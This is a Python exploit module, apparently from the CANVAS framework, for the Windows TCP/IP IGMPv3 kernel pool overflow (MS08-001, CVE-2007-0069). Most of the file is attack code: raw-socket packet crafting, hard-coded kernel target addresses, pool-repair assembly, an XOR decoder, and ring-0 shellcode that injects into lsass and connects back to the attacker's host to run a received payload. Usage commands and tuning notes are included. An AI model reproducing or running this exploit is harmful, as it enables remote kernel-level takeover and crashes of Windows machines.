#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct
import random

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='Windows TCP/IP IGMPv3 Overflow'
DESCRIPTION='Windows TCP/IP IGMPv3 Kernel Pool Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='01/08/08'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS08-001.mspx'
DOCUMENTATION['Repeatability']='One shot (on failure BSoD might be followed by a reboot, giving opportunity to try again)'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-0069'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0069'
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION['NOTES']='Due to the complexity of the bug, this exploit will never be 100% reliable. This version of the exploit will only work against non MP Windows kernels. Please READ THE EXPLOIT SOURCE for more information and notes.'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP'] #,'2003','Vista']
PROPERTY['MSADV']='MS08-001'

NOTES="""At the moment it will only work on nodes supporting raw sockets.
You can use either a Multicast address as target (i.e. 224.0.0.1) or a Broadcast address
(i.e. 10.10.10.255) or a Unicast address (i.e. 10.10.10.128). Windows XP Firewall by
default allows Broadcast and Multicast but not Unicast. Depending on the target address
type you chose, make sure that the packets are actually routed to the target!

Pool fixing code isn't very mature, a couple of links still need to be fixed, which means
the target can end up bugchecking 0xc5. You might want to install a mosdefservice and
restart the host as soon as possible.

Necessary conditions on sources IP in the packet:
- ip&0xf0000000!=0xe0000000 (high byte)
- each ip must be different

At the moment we can target ntkrnlpa.exe and probably ntkrnlos.exe, things are getting a
lot more complex with *mp*.exe kernels.

**About the delay option**
The delay option is used to delay the packet sending and allow the targets to process the
sent IP sources before getting some more and thus risking some packets drop. 16-32 seems to
work pretty well against fairly recent hardware, might require some tuning depending on
the processing speed, memory, etc. The for loop within the for loop ensures the delay will
increase with the numbers of IP sources already sent.
Understand that delay is a pretty important factor in the success rate of the exploit. It
must be fast enough so that the pool is filled accordingly to our plans, but it must not
overwhelm the CPU and lead to dropped packets.

Usage:
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
./exploits/ms08_001/ms08_001.py -v 1 -t 224.0.0.1 -l 10.10.10.226 -d 5555

Tested on:
Windows XP Professionnal SP2 English OOTB
Windows XP Home SP2 French OOTB
Windows XP Media Center Edition 2005 English OOTB
"""

KOSTYA="""
Some fixes I came up with, but it turned out the complexity was not necessary:

***** METHOD TO FIX NonPagedPoolDescriptor:
    movl 0x14(%esp),%edx
    movl 0x0(%edx),%edx //lower limit of the overwrite
    leal 0x403a0(%edx),%ebx //upper limit of the overwrite
    movl $0x200,%ecx
    movl $0x8055a6e8,%ebp //nt!NonPagedPoolDescriptor+0xa*4
initdescriptor:
    leal -0x8(%ebp,%ecx,8),%esi
    movl %esi,%edi
    lodsl
    cmp %eax,%edx
    jb skipfirstpointer
    cmp %eax,%ebx
    ja skipfirstpointer
    movl %edi,%eax
    stosl
    stosl
    jmp skipsecondpointer
skipfirstpointer:
    lodsl
    cmp %eax,%edx
    jb skipsecondpointer
    cmp %eax,%ebx
    ja skipsecondpointer
    movl %edi,%eax
    stosl
    stosl
skipsecondpointer:
    loop initdescriptor

***** METHOD TO FIX THE LookasideList (Processor and System):
    xorl %eax,%eax
    movl %fs:0x20(%eax),%ecx
    push $0x4
    pop %edx
    leal 0x598(%ecx,%edx,8),%esi
    movl 0x0(%esi),%ebp
    movl 0x0(%ebp),%eax //next link
    movl 0x4(%ebp),%edx //sequence number and depth
label1:
    or %eax,%eax
    jz label2
    movl %edx,%ecx
    xor %cx,%cx //should be xorw but MOSDEF doesn't like it
    xorl %ebx,%ebx
.byte 0xf0
.byte 0x0f
.byte 0xc7
.byte 0x4d
.byte 0x00 //lock cmpxchg8b 0x0(%ebp)
    jnz label1
label2:
    movl 0x4(%esi),%ebp
    movl 0x0(%ebp),%eax //next link
    movl 0x4(%ebp),%edx //sequence number and depth
label3:
    or %eax,%eax
    jz label4
    movl %edx,%ecx
    xor %cx,%cx //should be xorw but MOSDEF doesn't like it
    xorl %ebx,%ebx
.byte 0xf0
.byte 0x0f
.byte 0xc7
.byte 0x4d
.byte 0x00 //lock cmpxchg8b 0x0(%ebp)
    jnz label3
label4:

"""

CHANGELOG="""
"""

#Values to put in targets are: Where,What,MmNonPagedPoolFreeListHead+0x2*8,NonPagedPoolDescriptor+0xa*4
#Where is the movzx edx, word ptr [edx+2] right after the write4
#What is 0xXXXXe2ff in a writeable page
targets={
    0: ['Autodetect (N/A)',0],
    1: ['Windows XP SP2 Default (ntkrnlpa.exe v5.1.2600.2180)',0x80543f0b,0x8068e2ff,0x80552f50,0x8055a6e8],
    2: ['Windows XP SP2 Up2Date (ntkrnlpa.exe v5.1.2600.3093)',0x8054410b,0x8068e2ff,0x80553150,0x8055a8e8],
}

#grouping up the interesting values that can be modified for easier testing, will change that later

#N_SOURCES=0x10000+(0xf8/4) #if chunk is >0x100 it won't be freed to/allocated from the lookaside so we can get a write4 (alloc is (0xf8/4)*4+8, and +8 for header)
N_SOURCES=0x100e6 #size choosen to have a jnz as the PoolHeader
MAX_SOURCES=(1500-24-12)/4 #maximum number of source IPs per packet, based on an ethernet MTU of 1500

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.version=1
        self.badstring=''
        self.subesp=0 #not necessary?
        self.groupip=0xeffffffa
        self.count=0
        self.sourceIPs=[0 for i in range(N_SOURCES)] #source ips array
        self.hashIPs={} #hashtable to avoid duplicates in source ips array
        self.listenerArgsDict['fromcreatethread']=1
        self.TTL=0xff
        self.delay=128
        return

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]

    def createIgmpRing0CBShellcode(self,version):
        ring0shellcode='''    .byte 0xe8
    .byte 0xff
    .byte 0xff
    .byte 0xff
    .byte 0xff
start:
    ret
    pop %esi
    lea payload_begin-start(%esi),%esi
    xor %ecx,%ecx
    lea payload_end-payload_begin(%ecx),%ecx
    mov $0xffdf0804,%edi
    push %edi
    pop %ebx
    rep movsb
    jmp *%ebx
payload_begin:
    push $0x38
    pop %ebx
    mov %fs:(%ebx),%eax
    mov 0x4(%eax),%eax
search:
    .byte 0x66
    .byte 0x25
    .byte 0x01
    .byte 0xf0 //andw $0xf001,%ax
    dec %eax
    cmpw $0x5a4d,(%eax)
    jne search
    mov %eax,%ebp
    movw $0xac97,%bx
    call resolve_sym
    lea 0x4(%edi),%edx
    push %edx
    push $0xSystemPid
    call *%eax //PsLookupProcessByProcessId
    mov 0x4(%edi),%eax
    xor %ecx,%ecx
    movb $0xActiveProcessLinksOffset,%cl
    add %ecx,%eax
    xor %ecx,%ecx
    movw $0xImageFileNameOffset,%cx
find_proc_loop:
    mov (%eax),%eax
    cmpl $0x5341534c,(%ecx,%eax,1)
    je found_uppercase
    cmpl $0x7361736c,(%ecx,%eax,1)
    jne find_proc_loop
found_uppercase:
    //.byte 0xcc
    lea -0xActiveProcessLinksOffset(%eax),%eax
    push %eax
    push %eax
    movw $0xb768,%bx
    call resolve_sym
    call *%eax //KeAttachProcess
    push $0x4
    movl $0x2,0x10(%edi)
    lea 0x10(%edi),%ebx
    push %ebx
    push $0x22
    push $-0x1
    movw $0xae22,%bx
    call resolve_sym
    call *%eax //ZwSetInformationProcess
    movw $0xb764,%bx
    call resolve_sym
    call *%eax //KeDetachProcess
    pop %eax
    mov 0xThreadListHeadOffset(%eax),%ecx
find_delay_loop:
    mov (%ecx),%ecx
    cmpb $0x1,-0xApcQueueableOffset(%ecx)
    jne find_delay_loop
    lea -0xKThreadOffset(%ecx),%ecx
    mov %ecx,0x14(%edi)
    movw $0xb6b6,%bx
    call resolve_sym
    push $0x1000
    push $0x0
    call *%eax //ExAllocatePool
    mov %eax,0x10(%edi)
    movw $0xb6de,%bx
    call resolve_sym
    dec %eax
search_c3:
    inc %eax
    cmpb $0xc3,(%eax)
    jne search_c3
    push %eax
    pop %esi
    movw $0xb7a6,%bx
    call resolve_sym
    xor %edx,%edx
    push %edx
    push $0x1
    mov $0x7ffe0804,%ebx
    lea usermode_payload-payload_begin(%ebx),%ebx
    push %ebx
    push %edx
    push %esi
    push %edx
    mov 0x14(%edi),%ecx
    push %ecx
    mov 0x10(%edi),%ebx
    push %ebx
    call *%eax //KeInitializeApc
    movw $0xb648,%bx
    call resolve_sym
    xor %edx,%edx
    push %edx
    push %edx
    push %edx
    mov 0x10(%edi),%ebx
    push %ebx
    call *%eax //KeInsertQueueApc
    movw $0xab0f,%bx
    call resolve_sym
    xor %edx,%edx
    mov %edx,0x8(%edi)
    movl $0x80000000,0xc(%edi)
    lea 0x8(%edi),%ebx
    push %ebx
    push $0x0
    push $0x0
    call *%eax //KeDelayExecutionThread

    popad //restores original execution context
    movl %ebp,%esp
    popl %ebp
    ret $0xc

usermode_payload:
    nop
    nop
    nop
    nop
    .byte 0xe8
    .byte 0xff
    .byte 0xff
    .byte 0xff
    .byte 0xff
    ret
    pop %esi
    push $0x30
    pop %ecx
    mov %fs:(%ecx),%eax
    mov 0xc(%eax),%eax
    mov 0x1c(%eax),%esi
    lodsl
    mov 0x8(%eax),%ebp
    movw $0xb0e8,%bx
    call resolve_sym
    push $0x40
    push $0x1000
    push $0x2000
    push $0x0
    call *%eax
    .byte 0x96 //xchg %eax,%esi
    movw $0xb344,%bx
    call resolve_sym
    push $0x3233
    push $0x5f325357
    lea (%esp),%ebx
    push %ebx
    call *%eax
    push %ebp
    mov %eax,%ebp
    movw $0xb2a0,%bx
    call resolve_sym
    push $0x0
    push $0x0
    lea (%esp),%ebx
    push %ebx
    push $0x2
    call *%eax
    pop %ebx
    pop %ebx
    movw $0xbf01,%bx
    call resolve_sym
    push $0x0
    push $0x1
    push $0x2
    call *%eax
    .byte 0x97 //xchg %eax,%edi
    movw $0xbc2e,%bx
    call resolve_sym
    push $0xHost
    push $0xPort0002
    mov %esp,%ebx
    push $0x10
    push %ebx
    push %edi
    call *%eax
    pop %ebx
    pop %ebx
    test %eax,%eax
    jl bail_out
    movw $0xb862,%bx
    call resolve_sym
    push %eax
    push $0x0
    push $0x4
    push %esi
    push %edi
    call *%eax
    pop %eax
    push $0x0
    push $0x1fff
    push %esi
    push %edi
    call *%eax
    push %edi
    push %edi
    jmp *%esi
bail_out:
    pop %ebp
    movw $0xb2e0,%bx
    call resolve_sym
    xor %ecx,%ecx
    push %ecx
    call *%eax

resolve_sym:
    pushad
    movzwl 0x3c(%ebp),%esi
    mov 0x78(%ebp,%esi,1),%esi
    lea 0x0(%ebp,%esi,1),%edi
    push %edi
    mov 0x20(%edi),%edi
    lea 0x0(%ebp,%edi,1),%edi
    xor %ecx,%ecx
hash_f:
    mov (%edi,%ecx,4),%esi
    lea 0x0(%ebp,%esi,1),%esi
    xor %eax,%eax
    cltd
hash_loop:
    lodsb
    test %al,%al
    je hash_loop_out
    .byte 0x04
    .byte 0x0b //addb $0xb,%al
    xor $0x89,%al
    add %eax,%edx
    jmp hash_loop
hash_loop_out:
    xor $0xbabe,%edx
    inc %ecx
    cmp %bx,%dx
    jne hash_f
    dec %ecx
    xor %edx,%edx
    pop %edi
    mov 0x24(%edi),%esi
    lea 0x0(%ebp,%esi,1),%esi
    mov (%esi,%ecx,2),%dx
    shl $0x2,%edx
    mov 0x1c(%edi),%eax
    lea 0x0(%ebp,%eax,1),%eax
    mov (%edx,%eax,1),%eax
    lea 0x0(%ebp,%eax,1),%eax
    mov %eax,0x1c(%esp)
    popad
    ret
payload_end:
    .byte 0xcc
'''
        self.log('Creating RING0 connect back shellcode to %s:%d'%(self.callback.ip,self.callback.port))
        parameters={}
        parameters['Host']=struct.unpack('<L',socket.inet_aton(self.callback.ip))[0]
        parameters['Port']=socket.htons(self.callback.port)
        if version==0: #Windows 2000 SP0-SP4
            parameters['ActiveProcessLinksOffset']=0xa0
            parameters['ImageFileNameOffset']=0x1fc-0xa0
            parameters['ThreadListHeadOffset']=0x270
            parameters['ApcQueueableOffset']=0x240-0x15a
            parameters['KThreadOffset']=0x240
            parameters['SystemPid']=0x08
        elif version==1: #Windows XP SP0-SP2
            parameters['ActiveProcessLinksOffset']=0x88
            parameters['ImageFileNameOffset']=0x174-0x88
            parameters['ThreadListHeadOffset']=0x190
            parameters['ApcQueueableOffset']=0x22c-0x166
            parameters['KThreadOffset']=0x22c
            parameters['SystemPid']=0x04
        elif version==2: #Windows 2003 SP0
            parameters['ActiveProcessLinksOffset']=0x88
            parameters['ImageFileNameOffset']=0x154-0x88
            parameters['ThreadListHeadOffset']=0x170
            parameters['ApcQueueableOffset']=0x234-0x109
            parameters['KThreadOffset']=0x234
            parameters['SystemPid']=0x04
        elif version==3: #Windows 2003 SP1-SP2
            parameters['ActiveProcessLinksOffset']=0x98
            parameters['ImageFileNameOffset']=0x164-0x98
            parameters['ThreadListHeadOffset']=0x180
            parameters['ApcQueueableOffset']=0x224-0x3f
            parameters['KThreadOffset']=0x224
            parameters['SystemPid']=0x04
        for k in parameters.keys():
            ring0shellcode=ring0shellcode.replace(k,'%x'%(parameters[k]))
        self.shellcode=mosdef.assemble(ring0shellcode,'x86')
        return self.shellcode

    def createIgmpShellcode(self,Where,MmNonPagedPoolFreeListHead,NonPagedPoolDescriptor):
        poolfixing='''    pushad

    //fix the LookasideList (Processor and System)
    xorl %eax,%eax
    movl %fs:0x20(%eax),%ecx
    push $0x4
    pop %edx
    leal 0x598(%ecx,%edx,8),%edx
    mov 0x0(%edx),%edi
    stosl
    stosw
    mov 0x4(%edx),%edi
    stosl
    stosw

    //fix MmNonPagedPoolFreeListHead[2] (remove the last entry of the list)
    movl $0xMMNONPAGEDPOOLFREELISTHEAD,%ebx //nt!MmNonPagedPoolFreeListHead+0x2*8
    movl %ebx,%eax
    movl 0x0(%eax),%ecx
findlast:
    cmp 0x4(%eax),%ecx
    jz found
    movl 0x4(%eax),%eax
    jmp findlast
found:
    movl %ebx,0x4(%eax)
    movl %eax,0x0(%ebx)

    //fix NonPagedPoolDescriptor (reinitialize entries within range of our overwrite)
    movl $0x200,%ecx
    movl $0xNONPAGEDPOOLDESCRIPTOR,%edi //nt!NonPagedPoolDescriptor+0xa*4
initdescriptor:
    movl %edi,%eax
    stosl
    stosl
    loop initdescriptor

    //fix for DpcRoutineActive
    xorl %eax,%eax
    movl %eax,%fs:0x994(%eax)
        '''
        poolfixing=poolfixing.replace('MMNONPAGEDPOOLFREELISTHEAD','%08x'%(MmNonPagedPoolFreeListHead))
        poolfixing=poolfixing.replace('NONPAGEDPOOLDESCRIPTOR','%08x'%(NonPagedPoolDescriptor))
        shellcode=mosdef.assemble(poolfixing,'x86')
        print '[DEBUG] Assembled PoolFix size: %d'%(len(shellcode))
        shellcode+=self.createIgmpRing0CBShellcode(1)
        while len(shellcode)%4!=0:
            shellcode+='\xcc'
        DECODERSIZE=52
        #the two nops are necessary to avoid getting a duped DWORD in the array!
        decoder='''    nop
    nop
    pushad
    movl $0x0252b70f,0x0(0xWHERE) //restore the original instructions
    addl $0xOFFSET,%edx //%edx points to the beginning of the encoded shellcode
    mov %edx,0x4(%ebp) //replace the return address
    movl %edx,%esi
    movl %esi,%edi
    movl $0xSIZE,%ecx
decodeloop:
    lodsl
.byte 0x93 //xchg %ebx,%eax
    lodsl
    xorl %ebx,%eax
    stosl
    loop decodeloop
    movl $0xZERO,%ecx
    //xorl %eax,%eax
    movl $0xcccccccc,%eax
    repne stosl
    popad
    jmp *0xc(%edx)
    '''
        decoder=decoder.replace('OFFSET','%08x'%(16+DECODERSIZE)) #16 for PoolHeader+Tag+Pointers, DECODERSIZE for Decoder
        decoder=decoder.replace('SIZE','%08x'%(len(shellcode)/4))
        decoder=decoder.replace('WHERE','%08x'%(Where))
        decoder=decoder.replace('ZERO','%08x'%(0x10000-(16+DECODERSIZE-len(shellcode))/4)) #0x10000-(PoolHeader+Tag+Pointers+Decoder+Shellcode) DWORDs
        prepend=mosdef.assemble(decoder,'x86')
        print '[DEBUG] Assembled Decoder size: %d'%(len(prepend))
        if len(prepend)>DECODERSIZE:
            raise Exception,'Decoder size is not valid. It should be lower than %d (%d)!'%(DECODERSIZE,len(prepend))
        prepend=prepend+'\x90'*(DECODERSIZE-len(prepend))
        index=0xfffb
        for i in range(0,len(prepend),4):
            x=struct.unpack('<L',prepend[i:i+4])[0]
            if self.hashIPs.get(x)==True:
                raise Exception,'Source IP 0x%08x appears more than once in the array'%(x)
            self.hashIPs[x]=True
            self.sourceIPs[index]=x
            index-=1
        for i in range(0,len(shellcode),4):
            x=struct.unpack('<L',shellcode[i:i+4])[0]
            while True:
                y=random.randint(0,sys.maxint)
                if y&0xf0==0xe0 or self.hashIPs.get(y)==True:
                    continue
                if (x^y)&0xf0==0xe0 or self.hashIPs.get(x^y)==True:
                    continue
                break
            self.hashIPs[y]=True
            self.sourceIPs[index]=y
            index-=1
            self.hashIPs[x^y]=True
            self.sourceIPs[index]=x^y
            index-=1
        #dump the array:
        #for i in range(0xfffb,0xfffb-(len(shellcode)/4)*2-36/4,-1):
        #    print '0x%08x'%(self.sourceIPs[i])
        return ''

    def getArgs(self):
        self.host=self.target.interface
        self.delay=int(self.argsDict.get('delay',self.delay))
        return

    def test(self):
        self.getArgs()
        self.log('%s testing host %s'%(self.name,self.host))
        return 1

    def doChecksum(self,data):
        if len(data)%2==1:
            data+='\0'
        csum=0
        for i in range(0,len(data),2):
            csum+=struct.unpack('>H',data[i:i+2])[0]
            if (csum>0xffff):
                csum-=0xffff
        csum=(~csum)&0xffff
        return csum

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s (in progress)'%(NAME,self.host))
        if self.version==0:
            self.test()
            if self.version==0:
                self.log('Could not determine version automatically')
                self.setInfo('%s attacking %s - done (failed!)'%(NAME,self.host))
                return 0
            
        self.info,Where,What,MmNonPagedPoolFreeListHead,NonPagedPoolDescriptor=targets[self.version]
        self.log('Attacking %s'%(self.host))

        self.setProgress(5)
        node=self.argsDict['passednodes'][0]
        if node.nodetype!='LocalNode':
            self.log('This exploit will only work from a localNode')
            return 0
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_IGMP)
        except:
            self.log('Root privileges are required to create the raw socket')
            return 0
        s.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST,0x01)
        s.setsockopt(socket.IPPROTO_IP,socket.IP_OPTIONS,'\x94\x04\x00\x00')
        s.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_IF,socket.inet_aton(self.callback.ip)) 
        s.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,self.TTL);

        self.setProgress(10)
        targetip=struct.unpack('>L',socket.inet_aton(self.host))[0]
        sourceip=struct.unpack('>L',socket.inet_aton(self.callback.ip))[0]

        #nt!_POOL_HEADER for XP SP2
        PreviousSize=(((N_SOURCES&0xffff)*4)+8+8)/8 #must be correct to avoid BugCheck
        PoolIndex=0x07 #PreviousSize+PoolIndex<<9 will be 750e which is jnz over the PoolHeader+PoolTag+Pointers, can be whatever
        BlockSize=0x1ff #0x1ff can be whatever
        PoolType=0x00 #must be 0 to get the write4
        PoolHeader=(PreviousSize+(PoolIndex<<9)+(BlockSize<<16)+(PoolType<<25))&0xffffffff

        self.setProgress(15)
        #build the source IPs array
        self.log('Building the source IPs array')
        self.sourceIPs[0xfffc]=Where
        self.sourceIPs[0xfffd]=What
        self.sourceIPs[0xfffe]=0x71494354 #Tag ('TCIq', but can really be whatever)
        self.sourceIPs[0xffff]=PoolHeader
        #add those to the hashtable
        for i in range(0xfffc,0x10000):
            self.hashIPs[self.sourceIPs[i]]=True
        #create IGMPv3 compliant shellcode, dwords are added to the hashtable
        self.createIgmpShellcode(Where,MmNonPagedPoolFreeListHead,NonPagedPoolDescriptor)
        #fill in the reste of the array
        for i in range(N_SOURCES):
            if self.sourceIPs[i]==0:
                while True:
                    x=random.randint(0,sys.maxint)
                    if x&0xf0==0xe0 or self.hashIPs.get(x)==True:
                        continue
                    break
                self.hashIPs[x]=True
                self.sourceIPs[i]=x

        self.setProgress(20)
        #check the source IPs array for defects, it shouldn't have dupe since we check when adding those, but we make sure again
        self.log('Verifying the source IPs array')
        v={} #used to store unique IPs
        for i in range(N_SOURCES):
            if (self.sourceIPs[i]&0xf0)==0xe0: #if an IP is like eXXXXXXX, it wont be put in the array
                self.log('ERROR: Invalid source IP detected at index %d: 0x%08x'%(i,self.sourceIPs[i]))
                return 0
            if v.get(self.sourceIPs[i])==True: #dave says it is O(1)
                self.log('ERROR: Source IP 0x%08x appears more than once in the array'%(self.sourceIPs[i]))
                return 0
            v[self.sourceIPs[i]]=True

        self.setProgress(25)
        #sending the first frame with a timeout of 0 to trigger the report and thus clear the list
        self.log('Triggering report to clear the list')
        igmpData=struct.pack('>BBHL',0x11,0x00,0x0000,self.groupip)
        igmpData+=struct.pack('>BBH',0x08,0x00,0x0001)
        igmpData+=struct.pack('>L',sourceip)
        csum=self.doChecksum(igmpData)
        igmpData=igmpData[:2]+struct.pack('>H',csum)+igmpData[4:]
        s.sendto(igmpData,(self.host,0))
        self.count+=1
        self.log('Sleeping for 3s')
        time.sleep(3)
        self.log('Using delay: %d'%(self.delay))

        self.setProgress(30)
        #sending all the frames but the last one with maximum timeout limit to fill in the list
        self.log('Sending %d sources...'%(N_SOURCES))
        k=0
        for i in range(N_SOURCES/MAX_SOURCES):
            #igmpv3 query (http://www.ietf.org/rfc/rfc3376.txt)
            igmpData=struct.pack('>BBHL',0x11,0xff,0x0000,self.groupip)
            igmpData+=struct.pack('>BBH',0x08,0xff,MAX_SOURCES)
            for j in range(MAX_SOURCES):
                igmpData+=struct.pack('<L',self.sourceIPs[k])
                k+=1
            csum=self.doChecksum(igmpData)
            igmpData=igmpData[:2]+struct.pack('>H',csum)+igmpData[4:]
            s.sendto(igmpData,(self.host,0))
            self.count+=1
            for j in range(self.delay): #128 should probably be scaled with the processing speed of the machine the exploit is run on
                for l in range(0,k-MAX_SOURCES+j):
                    continue
            self.log('IP sources sent: %5d/%5d'%(k,N_SOURCES))

        self.setProgress(95)
        #sending the last frame with a timeout value of 0 to trigger the report and the pool overflow
        self.log('Triggering report')
        igmpData=struct.pack('>BBHL',0x11,0x00,0x0000,self.groupip)
        n=N_SOURCES-((N_SOURCES/MAX_SOURCES)*MAX_SOURCES) #remaining IPs in last packet
        igmpData+=struct.pack('>BBH',0x08,0x00,n)
        for j in range(n):
            igmpData+=struct.pack('<L',self.sourceIPs[k])
            k+=1
        csum=self.doChecksum(igmpData)
        igmpData=igmpData[:2]+struct.pack('>H',csum)+igmpData[4:]
        s.sendto(igmpData,(self.host,0))
        self.count+=1
        self.log('IP sources sent: %5d/%5d'%(k,N_SOURCES))
        self.log('Packets sent: %d'%(self.count))
        self.log('Waiting for the targets to process the packets...')
        time.sleep(15)

        self.setProgress(100)
        if self.ISucceeded():
            self.setInfo('%s attacking %s - done (success!)'%(NAME,self.host))
            return 1
        self.log('Attack done - failed - no shells!')
        self.setInfo('%s attacking %s - done (failed)'%(NAME,self.host))
        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
